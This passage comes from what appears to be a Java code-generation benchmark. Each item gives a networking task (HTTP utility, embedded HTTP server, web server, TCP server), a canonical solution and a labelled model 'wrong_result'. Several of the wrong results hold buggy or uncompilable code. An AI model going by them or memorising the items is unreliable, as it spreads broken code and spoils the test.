    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\nimport java.util.*;\n\npublic class MockPop3Server {\n    private final Deque<ImapInteraction> interactions;\n    private final CountDownLatch waitForConnectionClosed;\n    private final CountDownLatch waitForAllExpectedCommands;\n    private final Thread mockServerThread;\n    private final String host;\n    private final int port;\n    private volatile boolean serverRunning = true;\n\n    public MockPop3Server(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.interactions = new ArrayDeque<>();\n        this.waitForConnectionClosed = new CountDownLatch(1);\n        this.waitForAllExpectedCommands = new CountDownLatch(1);\n        this.mockServerThread = new MockServerThread();\n    }\n\n    public void start() {\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            mockServerThread.setServerSocket(serverSocket);\n            mockServerThread.setInteractions(interactions);\n            mockServerThread.setWaitForConnectionClosed(waitForConnectionClosed);\n            mockServerThread.setWaitForAllExpectedCommands(waitForAllExpectedCommands);\n            mockServerThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        serverRunning = false;\n        mockServerThread.shouldStop();\n    }\n\n    private class MockServerThread extends Thread {\n        private ServerSocket serverSocket;\n        private Deque<ImapInteraction> interactions;\n        private CountDownLatch waitForConnectionClosed;\n        private CountDownLatch waitForAllExpectedCommands;\n\n        public MockServerThread() {\n            super(\"MockPop3Server\");\n        }\n\n        public void setServerSocket(ServerSocket serverSocket) {\n            this.serverSocket = serverSocket;\n        }\n\n        public void setInteractions(Deque<ImapInteraction> interactions) {\n            this.interactions = interactions;\n        }\n\n        public void setWaitForConnectionClosed(CountDownLatch waitForConnectionClosed) {\n            this.waitForConnectionClosed = waitForConnectionClosed;\n        }\n\n        public void setWaitForAllExpectedCommands(CountDownLatch waitForAllExpectedCommands) {\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (serverRunning) {\n                    Socket clientSocket = serverSocket.accept();\n                    handleClient(clientSocket);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (serverSocket != null) {\n                        serverSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleClient(Socket clientSocket) throws IOException {\n            try {\n                handleInteractions(clientSocket);\n                readAdditionalCommands(clientSocket);\n                waitForConnectionClosed.countDown();\n            } finally {\n                clientSocket.close();\n            }\n        }\n\n        private void handleInteractions(Socket clientSocket) throws IOException {\n            while (serverRunning && !interactions.isEmpty()) {\n                ImapInteraction interaction = interactions.poll();\n                if (interaction == null) break;\n                String clientCommand = readLine(clientSocket);\n                if (clientCommand.equals(interaction.getCommand())) {\n                    clientSocket.getOutputStream().write((interaction.getReply() + \"\\r\\n\").getBytes());\n                } else {\n                    readAdditionalCommands(clientSocket);\n                }\n            }\n            if (interactions.isEmpty()) {\n                waitForAllExpectedCommands.countDown();\n            }\n        }\n\n        private void readAdditionalCommands(Socket clientSocket) throws IOException {\n            while (serverRunning) {\n                String line = readLine(clientSocket);\n                if (line.trim().isEmpty()) break;\n            }\n        }\n\n        private String readLine(Socket clientSocket) throws IOException {\n            StringBuilder sb = new StringBuilder();\n            int bytesRead;\n            byte[] buffer = new byte[1024];\n            while ((bytesRead = clientSocket.getInputStream().read(buffer)) != -1) {\n                String line = new String(buffer, 0, bytesRead).trim();\n                if (line.isEmpty()) continue;\n                sb.append(line);\n                int newlineIndex = sb.toString().indexOf(\"\\r\\n\");\n                if (newlineIndex != -1) {\n                    return sb.substring(0, newlineIndex);\n                }\n            }\n            return sb.toString();\n        }\n\n        public void shouldStop() {\n            serverRunning = false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 55,
    "Instruction": "Task Description: Create a Java utility class for handling HTTP requests and responses, including POST operations, with support for proxies, timeouts, and error handling.\n\nClass Description: JavaHttpUtility is a helper class designed to simplify HTTP communication in Java applications. It provides methods for making POST requests, handling responses, and managing errors. The class supports proxy configuration, connection timeouts, and compressed responses (gzip).\n\nAttributes:\nCONNECT_TIMEOUT: [int] - Connection timeout in milliseconds (default: 10000)\nREAD_TIMEOUT: [int] - Read timeout in milliseconds (default: 10000)\n\nMethods:\ngetProxy: () -> [Proxy] - Retrieves system proxy settings if configured\ndoPost: (String urlAddress, Map<String, String> param) -> [String] - Executes a POST request to the specified URL with given parameters\nhandleResponse: (HttpURLConnection httpURLConnection) -> [String] - Processes the HTTP response and handles errors\nreadResult: (HttpURLConnection urlConnection) -> [String] - Reads and returns the successful response body\nhandleError: (HttpURLConnection urlConnection) -> [String] - Processes and throws appropriate exceptions for error responses",
    "Canonical_solution": "import org.json.JSONException;\nimport org.json.JSONObject;\nimport org.qii.weiciyuan.support.debug.AppLogger;\nimport org.qii.weiciyuan.support.error.ErrorCode;\nimport org.qii.weiciyuan.support.error.WeiboException;\nimport org.qii.weiciyuan.support.utils.Utility;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.InterruptedIOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.zip.GZIPInputStream;\n\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class JavaHttpUtility {\n\n    private static final int CONNECT_TIMEOUT = 10 * 1000;\n    private static final int READ_TIMEOUT = 10 * 1000;\n\n    private static Proxy getProxy() {\n        String proxyHost = System.getProperty(\"http.proxyHost\");\n        String proxyPort = System.getProperty(\"http.proxyPort\");\n        if (!TextUtils.isEmpty(proxyHost) && !TextUtils.isEmpty(proxyPort)) {\n            return new Proxy(java.net.Proxy.Type.HTTP,\n                    new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));\n        } else {\n            return null;\n        }\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws WeiboException {\n        try {\n            URL url = new URL(urlAddress);\n            Proxy proxy = getProxy();\n            HttpsURLConnection uRLConnection;\n            if (proxy != null) {\n                uRLConnection = (HttpsURLConnection) url.openConnection(proxy);\n            } else {\n                uRLConnection = (HttpsURLConnection) url.openConnection();\n            }\n\n            uRLConnection.setDoInput(true);\n            uRLConnection.setDoOutput(true);\n            uRLConnection.setRequestMethod(\"POST\");\n            uRLConnection.setUseCaches(false);\n            uRLConnection.setConnectTimeout(CONNECT_TIMEOUT);\n            uRLConnection.setReadTimeout(READ_TIMEOUT);\n            uRLConnection.setInstanceFollowRedirects(false);\n            uRLConnection.setRequestProperty(\"Connection\", \"Keep-Alive\");\n            uRLConnection.setRequestProperty(\"Charset\", \"UTF-8\");\n            uRLConnection.setRequestProperty(\"Accept-Encoding\", \"gzip, deflate\");\n            uRLConnection.connect();\n\n            DataOutputStream out = new DataOutputStream(uRLConnection.getOutputStream());\n            out.write(Utility.encodeUrl(param).getBytes());\n            out.flush();\n            out.close();\n            return handleResponse(uRLConnection);\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        }\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws WeiboException {\n        int status = 0;\n        try {\n            status = httpURLConnection.getResponseCode();\n        } catch (IOException e) {\n            httpURLConnection.disconnect();\n            throw new WeiboException(\"Timeout\", e);\n        }\n\n        if (status != HttpURLConnection.HTTP_OK) {\n            return handleError(httpURLConnection);\n        }\n\n        return readResult(httpURLConnection);\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getInputStream();\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            return strBuilder.toString();\n        } catch (IOException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n\n    private String handleError(HttpURLConnection urlConnection) throws WeiboException {\n        InputStream is = null;\n        BufferedReader buffer = null;\n        try {\n            is = urlConnection.getErrorStream();\n            if (is == null) {\n                throw new WeiboException(\"Unknown network error\");\n            }\n\n            String content_encode = urlConnection.getContentEncoding();\n            if (!TextUtils.isEmpty(content_encode) && content_encode.equals(\"gzip\")) {\n                is = new GZIPInputStream(is);\n            }\n\n            buffer = new BufferedReader(new InputStreamReader(is));\n            StringBuilder strBuilder = new StringBuilder();\n            String line;\n            while ((line = buffer.readLine()) != null) {\n                strBuilder.append(line);\n            }\n            AppLogger.d(\"error result=\" + strBuilder.toString());\n            \n            JSONObject json = new JSONObject(strBuilder.toString());\n            String err = json.optString(\"error_description\", \"\");\n            if (TextUtils.isEmpty(err)) {\n                err = json.getString(\"error\");\n            }\n            int errCode = json.getInt(\"error_code\");\n            WeiboException exception = new WeiboException();\n            exception.setError_code(errCode);\n            exception.setOriError(err);\n\n            if (errCode == ErrorCode.EXPIRED_TOKEN || errCode == ErrorCode.INVALID_TOKEN) {\n                Utility.showExpiredTokenDialogOrNotification();\n            }\n\n            throw exception;\n        } catch (IOException | JSONException e) {\n            throw new WeiboException(\"Timeout\", e);\n        } finally {\n            Utility.closeSilently(is);\n            Utility.closeSilently(buffer);\n            urlConnection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class JavaHttpUtility {\n    private static final int CONNECT_TIMEOUT = 10000;\n    private static final int READ_TIMEOUT = 10000;\n\n    public Proxy getProxy() {\n        try {\n            List<Proxy> proxies = ProxySelector.getDefault().select(new URI(\"http://example.com\"));\n            if (!proxies.isEmpty()) {\n                return proxies.get(0);\n            }\n        } catch (URISyntaxException e) {\n            // Ignore\n        }\n        return null;\n    }\n\n    public String doPost(String urlAddress, Map<String, String> param) throws IOException {\n        URL url = new URL(urlAddress);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        Proxy proxy = getProxy();\n        if (proxy != null) {\n            connection.setProxy(proxy);\n        }\n        connection.setRequestMethod(\"POST\");\n        connection.setConnectTimeout(CONNECT_TIMEOUT);\n        connection.setReadTimeout(READ_TIMEOUT);\n        connection.setDoOutput(true);\n        connection.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        StringBuilder postData = new StringBuilder();\n        for (Map.Entry<String, String> entry : param.entrySet()) {\n            if (postData.length() > 0) {\n                postData.append('&');\n            }\n            postData.append(encode(entry.getKey()))\n                    .append('=')\n                    .append(encode(entry.getValue()));\n        }\n\n        try (OutputStream os = connection.getOutputStream()) {\n            byte[] input = postData.toString().getBytes(\"UTF-8\");\n            os.write(input, 0, input.length);\n        }\n\n        return handleResponse(connection);\n    }\n\n    private String handleResponse(HttpURLConnection httpURLConnection) throws IOException {\n        int responseCode = httpURLConnection.getResponseCode();\n        if (responseCode >= 200 && responseCode < 300) {\n            return readResult(httpURLConnection);\n        } else {\n            throw new IOException(\"HTTP error code: \" + responseCode);\n        }\n    }\n\n    private String readResult(HttpURLConnection urlConnection) throws IOException {\n        InputStream inputStream = urlConnection.getInputStream();\n        String contentEncoding = urlConnection.getHeaderField(\"Content-Encoding\");\n        if (\"gzip\".equals(contentEncoding)) {\n            inputStream = new GZIPInputStream(inputStream);\n        }\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder result = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            result.append(line);\n        }\n        return result.toString();\n    }\n\n    private void handleError(HttpURLConnection urlConnection) throws IOException {\n        int responseCode = urlConnection.getResponseCode();\n        String responseMessage = urlConnection.getResponseMessage();\n        throw new IOException(\"HTTP error code: \" + responseCode + \" - \" + responseMessage);\n    }\n\n    private String encode(String s) {\n        return URLEncoder.encode(s, StandardCharsets.UTF_8);\n    }\n}"
  },
  {
    "Task_id": 550,
    "Instruction": "Task Description: Implement a simple embedded HTTP server class that can handle incoming HTTP requests, parse request information, and provide a framework for custom request handling.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP request headers and content, and provides hooks for custom request processing. It handles the low-level socket communication while delegating the actual request handling to subclasses or implementations.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n- serverSocket: ServerSocket - The server socket instance used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a dedicated thread for handling connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- run() -> void - The main server loop that accepts connections and processes requests (runs in a separate thread)\n- handle(String method, String path, HashMap<String,String> headers, Map<String,String> queries, InputStream input, OutputStream response) -> void - Abstract method meant to be overridden for custom request handling (does nothing in base implementation)\n- parsePath(String path) -> Map<String,String> - Helper method that parses the request path and extracts query parameters",
    "Canonical_solution": "import android.text.TextUtils;\nimport com.antfortune.freeline.router.ISchemaAction;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class EmbedHttpServer {\n\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this::run, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    private void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0 && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                OutputStream response = new ResponseOutputStream(os);\n\n                Map<String, String> queries = parsePath(path);\n                handle(method, path, headers, queries, input, response);\n                response.close();\n\n                conn.close();\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {}\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    protected void handle(String method, String path,\n                         HashMap<String, String> headers, Map<String, String> queries, InputStream input,\n                         OutputStream response) throws Exception {\n    }\n\n    private static Map<String, String> parsePath(String path) {\n        if (TextUtils.isEmpty(path)) {\n            return null;\n        }\n        int descriptionIndex = path.indexOf(\"/\");\n        if (descriptionIndex == -1) {\n            return null;\n        }\n        String description = path.substring(descriptionIndex + 1);\n        Map<String, String> queries = new HashMap<>();\n        int queryIndex = description.indexOf(\"?\");\n        if (queryIndex == -1) {\n            queries.put(ISchemaAction.DESCRIPTION, description);\n        } else {\n            queries.put(ISchemaAction.DESCRIPTION, description.substring(0, queryIndex));\n            description = description.substring(queryIndex + 1);\n        }\n        String[] arr = description.split(\"&\");\n        for (String segment : arr) {\n            String[] query = segment.split(\"=\");\n            if (query.length == 2) {\n                queries.put(query[0], query[1]);\n            } else if (query.length == 1) {\n                queries.put(query[0], \"\");\n            }\n        }\n        return queries;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class EmbedHttpServer {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            Thread thread = new Thread(this);\n            thread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket clientSocket = serverSocket.accept();\n                handleRequest(clientSocket);\n            } catch (IOException e) {\n                e.printStackTrace();\n                break;\n            }\n        }\n    }\n\n    protected void handleRequest(Socket clientSocket) throws IOException {\n        InputStream input = clientSocket.getInputStream();\n        OutputStream output = clientSocket.getOutputStream();\n\n        String requestLine = readLine(input);\n        String[] parts = requestLine.split(\" \");\n        String method = parts[0];\n        String path = parts[1];\n        String protocol = parts[2];\n\n        HashMap<String, String> headers = new HashMap<>();\n        while (true) {\n            String line = readLine(input);\n            if (line.isEmpty()) {\n                break;\n            }\n            String[] headerParts = line.split(\": \", 2);\n            if (headerParts.length == 2) {\n                headers.put(headerParts[0], headerParts[1]);\n            }\n        }\n\n        Map<String, String> queries = parsePath(path);\n\n        handle(method, path, headers, queries, input, output);\n    }\n\n    private String readLine(InputStream input) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = input.read()) != -1) {\n            if (c == '\\r') {\n                int next = input.read();\n                if (next == '\\n') {\n                    return sb.toString();\n                } else {\n                    sb.append((char) c);\n                }\n            } else if (c == '\\n') {\n                return sb.toString();\n            } else {\n                sb.append((char) c);\n            }\n        }\n        return sb.toString();\n    }\n\n    private Map<String, String> parsePath(String path) {\n        Map<String, String> queries = new HashMap<>();\n        int questionMarkIndex = path.indexOf('?');\n        if (questionMarkIndex != -1) {\n            String queryString = path.substring(questionMarkIndex + 1);\n            String[] params = queryString.split(\"&\");\n            for (String param : params) {\n                int equalsIndex = param.indexOf('=');\n                if (equalsIndex != -1) {\n                    String key = param.substring(0, equalsIndex);\n                    String value = param.substring(equalsIndex + 1);\n                    queries.put(key, value);\n                }\n            }\n        }\n        return queries;\n    }\n\n    protected abstract void handle(String method, String path, HashMap<String, String> headers, Map<String, String> queries, InputStream input, OutputStream response);\n}"
  },
  {
    "Task_id": 552,
    "Instruction": "Task Description: Implement a basic HTTP server in Java using ServerSocket that handles GET requests and responds with appropriate HTTP status codes.\n\nClass Description: The Webserver class represents a simple HTTP server that listens on a specified port, accepts client connections, processes HTTP GET requests, and sends responses. It uses multi-threading to handle multiple client connections simultaneously.\n\nAttributes:\n- socket: ServerSocket - The server socket that listens for incoming client connections\n\nMethods:\n- Webserver(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Starts the server, continuously accepting client connections and spawning ServiceThreads to handle them\n- process(Socket clnt) -> void - Processes a client connection by reading the request and sending a response\n- readLine(InputStream in) -> String - Reads a line of text from the input stream until CRLF is encountered\n- skipLine(InputStream in) -> int - Skips a line in the input stream and returns its length\n- doReply(InputStream in, OutputStream out, String cmd) -> void - Processes the HTTP command and generates an appropriate response\n- replyError(OutputStream out, Exception e) -> void - Sends an HTTP error response to the client\n\nAdditional Class:\nServiceThread: A helper class that extends Thread to handle individual client connections in separate threads\n\nServiceThread Attributes:\n- web: Webserver - Reference to the main server instance\n- sock: Socket - The client socket connection\n\nServiceThread Methods:\n- ServiceThread(Webserver w, Socket s) -> void - Constructor that initializes the thread with server and client socket references\n- run() -> void - The thread's main execution method that processes the client request",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class Webserver {\n    private ServerSocket socket;\n\n    public Webserver(int port) throws IOException {\n        socket = new ServerSocket(port);\n    }\n\n    public void run() {\n        System.err.println(\"ready to service...\");\n        for (;;)\n            try {\n                ServiceThread th = new ServiceThread(this, socket.accept());\n                th.start();\n            }\n            catch (IOException e) {\n                System.out.println(e.toString());\n            }\n    }\n\n    final void process(Socket clnt) throws IOException {\n        InputStream in = new BufferedInputStream(clnt.getInputStream());\n        OutputStream out = new BufferedOutputStream(clnt.getOutputStream());\n        try {\n            String cmd = readLine(in);\n            while (skipLine(in) > 0) {}\n            doReply(in, out, cmd);\n        }\n        catch (Exception e) {\n            replyError(out, e);\n        }\n        finally {\n            out.flush();\n            in.close();\n            out.close();\n            clnt.close();\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder buf = new StringBuilder();\n        int c;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            buf.append((char)c);\n        in.read();\n        return buf.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int c;\n        int len = 0;\n        while ((c = in.read()) >= 0 && c != 0x0d)\n            ++len;\n        in.read();\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd) throws IOException {\n        if (cmd.startsWith(\"GET /\")) {\n            String filename = cmd.substring(5, cmd.indexOf(' ', 5));\n            out.write(\"HTTP/1.0 200 OK\\r\\n\\r\\n\".getBytes());\n        }\n        else\n            throw new IOException(\"Bad Request\");\n    }\n\n    private void replyError(OutputStream out, Exception e) throws IOException {\n        out.write(\"HTTP/1.0 400 Bad Request\\r\\n\\r\\n\".getBytes());\n        out.write(\"<H1>Bad Request</H1>\".getBytes());\n    }\n}\n\nclass ServiceThread extends Thread {\n    Webserver web;\n    Socket sock;\n\n    public ServiceThread(Webserver w, Socket s) {\n        web = w;\n        sock = s;\n    }\n\n    @Override\n    public void run() {\n        try {\n            web.process(sock);\n        }\n        catch (IOException e) {\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class Webserver {\n    private ServerSocket socket;\n\n    public Webserver(int port) {\n        try {\n            this.socket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        while (true) {\n            try {\n                Socket clnt = socket.accept();\n                new ServiceThread(this, clnt).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void process(Socket clnt) {\n        try {\n            InputStream in = clnt.getInputStream();\n            OutputStream out = clnt.getOutputStream();\n            String firstLine = readLine(in);\n            String cmd = firstLine.split(\" \")[0];\n            doReply(in, out, cmd);\n        } catch (IOException e) {\n            replyError(out, e);\n        }\n    }\n\n    private String readLine(InputStream in) throws IOException {\n        StringBuilder sb = new StringBuilder();\n        int c;\n        while ((c = in.read()) != -1) {\n            sb.append((char) c);\n            if (c == '\\r') {\n                int next = in.read();\n                if (next == '\\n') {\n                    break;\n                } else {\n                    break;\n                }\n            }\n        }\n        return sb.toString();\n    }\n\n    private int skipLine(InputStream in) throws IOException {\n        int len = 0;\n        int c;\n        while ((c = in.read()) != -1) {\n            len++;\n            if (c == '\\r') {\n                int next = in.read();\n                if (next == '\\n') {\n                    break;\n                } else {\n                    break;\n                }\n            }\n        }\n        return len;\n    }\n\n    public void doReply(InputStream in, OutputStream out, String cmd) {\n        if (cmd.equals(\"GET\")) {\n            try {\n                String response = \"HTTP/1.1 200 OK\\r\\n\\r\\n\";\n                out.write(response.getBytes());\n            } catch (IOException e) {\n                replyError(out, e);\n            }\n        } else {\n            try {\n                String response = \"HTTP/1.1 400 Bad Request\\r\\n\\r\\n\";\n                out.write(response.getBytes());\n            } catch (IOException e) {\n                replyError(out, e);\n            }\n        }\n    }\n\n    public void replyError(OutputStream out, Exception e) {\n        try {\n            String response = \"HTTP/1.1 500 Internal Server Error\\r\\n\\r\\n\";\n            out.write(response.getBytes());\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}\n\npublic class ServiceThread extends Thread {\n    private Webserver web;\n    private Socket sock;\n\n    public ServiceThread(Webserver w, Socket s) {\n        this.web = w;\n        this.sock = s;\n    }\n\n    public void run() {\n        web.process(sock);\n    }\n}"
  },
  {
    "Task_id": 553,
    "Instruction": "Task Description: Create a TCP server class that listens for incoming client connections, handles each client connection in a separate thread, and processes incoming data from clients.\n\nClass Description: TCPServer is a Java class that implements a basic TCP server using ServerSocket. It listens on a specified port for incoming client connections, creates a new thread for each connected client, and reads UTF-encoded messages from clients. The server maintains a running state and properly closes resources when finished.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- started: boolean - Flag indicating whether the server is running\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, begins listening for connections, and creates new threads for each client\n- ClientHandler(Socket socket) -> void - Constructor for the inner client handler class (takes a client socket as parameter)\n- run() -> void - The thread's main execution method that reads data from the client (inherited from Thread)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n        started = true;\n        System.out.println(\"Server started\");\n\n        try {\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                System.out.println(\"A client connected!\");\n                new ClientHandler(clientSocket).start();\n            }\n        } finally {\n            if (serverSocket != null) {\n                serverSocket.close();\n            }\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n        private DataInputStream inputStream;\n\n        public ClientHandler(Socket socket) throws IOException {\n            this.socket = socket;\n            this.inputStream = new DataInputStream(socket.getInputStream());\n        }\n\n        @Override\n        public void run() {\n            try {\n                System.out.println(inputStream.readUTF());\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    if (inputStream != null) {\n                        inputStream.close();\n                    }\n                    if (socket != null) {\n                        socket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class TCPServer {\n    private ServerSocket serverSocket;\n    private boolean started;\n\n    public void start(int port) {\n        started = true;\n        try {\n            serverSocket = new ServerSocket(port);\n            while (started) {\n                Socket clientSocket = serverSocket.accept();\n                new ClientHandler(clientSocket).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (serverSocket != null) {\n                try {\n                    serverSocket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    private class ClientHandler extends Thread {\n        private Socket socket;\n\n        public ClientHandler(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream(), \"UTF-8\"));\n                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    System.out.println(\"Client said: \" + inputLine);\n                    out.println(\"Server received: \" + inputLine);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 555,
    "Instruction": "Task Description: Create a TCP server class that handles multiple types of client requests through socket communication, supporting operations like content updates, progress tracking, and layout management.\n\nClass Description: LinkServer is a TCP server implementation that listens on a specified port for incoming client connections. It handles different types of requests defined by operation codes, manages client connections in separate threads, and provides bidirectional communication through input/output streams.\n\nAttributes:\n- server: ServerSocket - The main server socket that listens for incoming connections\n- port: int - The port number on which the server listens (default: 9999)\n- UPDATE_CONTENT: int - Constant for content update operation (value: 1)\n- UPDATE_PROGRESS: int - Constant for progress update operation (value: 2)\n- GET_CURRENT_CONTENT: int - Constant for content retrieval operation (value: 3)\n- SET_DRAW_DEBUG: int - Constant for debug mode setting operation (value: 4)\n- GET_LAYOUT_LIST: int - Constant for layout list retrieval operation (value: 5)\n- GET_CURRENT_LAYOUT: int - Constant for current layout retrieval operation (value: 6)\n- UPDATE_LAYOUT_DIMENSIONS: int - Constant for layout dimensions update operation (value: 7)\n\nMethods:\n- LinkServer() -> void - Default constructor initializes server with default port\n- LinkServer(int port) -> void - Constructor that takes a custom port number\n- init() -> void - Initializes the ServerSocket instance\n- start() -> void - Starts the server and begins accepting client connections in a dedicated thread\n- handleRequest(Socket socket) -> void - Handles client requests in a separate thread (Input: client socket)\n- closeConnection(Socket socket) -> void - Closes the client socket connection (Input: client socket to close)",
